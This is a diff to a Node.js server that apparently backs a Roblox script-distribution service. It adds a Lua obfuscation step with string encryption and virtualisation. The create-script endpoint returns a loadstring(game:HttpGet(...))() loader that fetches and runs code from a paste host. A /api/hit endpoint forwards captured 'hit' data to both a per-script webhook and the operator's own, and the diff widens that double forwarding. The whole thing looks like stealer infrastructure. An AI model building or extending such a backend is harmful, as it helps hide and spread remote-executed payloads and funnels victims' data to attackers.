@@ -26,6 +26,8 @@ const WEBHOOK_URL = process.env.WEBHOOK_URL;
 const PASTEFY_KEY = process.env.PASTEFY_KEY;
 
 const pastefy = new PastefyClient(PASTEFY_KEY);
+const log = (msg) => console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
+
 
 async function uploadScript(script, scriptTitle, folder) {
     try {
@@ -38,16 +40,69 @@ async function uploadScript(script, scriptTitle, folder) {
             type: 'PASTE'
         });
 
-        console.log(`✅ Succès ! Fichier uploadé.`);
-        console.log(`🔗 URL: ${paste.raw_url}`);
+        log(`✅ Succès ! Fichier uploadé.`);
+        log(`🔗 URL: ${paste.raw_url}`);
         return paste;
     } catch (error) {
-        console.error('❌ Erreur lors de l\'upload :', error);
+        log('❌ Erreur lors de l\'upload :', error);
     }
     return null;
 }
+async function obfuscateScript(luaCode) {
+    try {
+        log("🔍 [OBF] Step 1: Creating Session...");
 
-const log = (msg) => console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
+        // ÉTAPE 1 : Créer la session avec le code source
+        const sessionResponse = await axios.post('https://api.luaobfuscator.com/v1/obfuscator/newscript', 
+            luaCode, // Le code est envoyé directement comme texte
+            {
+                headers: {
+                    'apikey': process.env.LUA_OBF_KEY,
+                    'content-type': 'text/plain' // La doc dit 'text'
+                }
+            }
+        );
+
+        const sessionId = sessionResponse.data.sessionId;
+        if (!sessionId) throw new Error("No Session ID returned");
+
+        log(`🔍 [OBF] Step 2: Applying Obfuscation (Session: ${sessionId.substring(0, 8)}...)`);
+
+        // ÉTAPE 2 : Appliquer les plugins d'obfuscation
+        const obfResponse = await axios.post('https://api.luaobfuscator.com/v1/obfuscator/obfuscate', 
+            {
+                "MinifiyAll": true,   // Dans le noeud racine
+                "Virtualize": true,   // Dans le noeud racine
+                "CustomPlugins": {
+                    // Recommandé avant la virtualisation pour éviter les erreurs
+                    "RewriteToLua51": true, 
+                    "EncryptStrings": [100],
+                    "ControlFlowFlattenV1AllBlocks": [100],
+                    "SwizzleLookups": [100],
+                    "MutateAllLiterals": [100] // Très bien car sans impact sur les perfs
+                }
+            }, 
+            {
+                headers: {
+                    'apikey': process.env.LUA_OBF_KEY,
+                    'sessionId': sessionId,
+                    'content-type': 'application/json'
+                }
+            }
+        );
+
+        if (obfResponse.data && obfResponse.data.code) {
+            log(`✅ [OBF] Success! Final code received.`);
+            return obfResponse.data.code;
+        }
+
+        return null;
+
+    } catch (error) {
+        log(`❌ [OBF ERROR] ${error.response?.data?.message || error.message}`);
+        return null;
+    }
+}
 
 function generateScriptId() {
     const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
@@ -130,6 +185,7 @@ app.post('/api/create-script', async (req, res) => {
         ].join('\n');
 
         const paste = await uploadScript(lua, `${scriptId}.lua`, 'hfI1y3F8');
+        
         // Ne pas enregistrer en base pour l'instant — juste retourner le script
         return res.status(201).json({ success: true, data: { Script: `loadstring(game:HttpGet("${paste.raw_url}"))()` } });
     } catch (err) {
@@ -226,13 +282,13 @@ app.post('/api/hit', async (req, res) => {
             log('⚠️ WEBHOOK_URL non configuré, skip forward to env webhook');
         }
 
-        // Si ScriptId présent et valide (non null, non vide, non "Master"), rechercher script et forwarder aussi
+        // Si ScriptId présent et valide (non null, non vide), rechercher script et forwarder aussi
         try {
             if (hitInfo.ScriptId && String(hitInfo.ScriptId).trim() !== '') {
                 const script = await ScriptsInfos.findOne({ Id: String(hitInfo.ScriptId) }).lean();
                 if (script && script.WebHookUrl) {
                     // éviter double envoi vers la même URL
-                    if (!WEBHOOK_URL || String(script.WebHookUrl) !== String(WEBHOOK_URL)) {
+                    if (String(script.WebHookUrl) !== String(WEBHOOK_URL)) {
                         PostHitOnWebHook(script.WebHookUrl, hitInfo)
                             .catch(err => log(`⚠️ PostHitOnWebHook (script) rejection: ${err && err.message ? err.message : err}`));
                     } else {
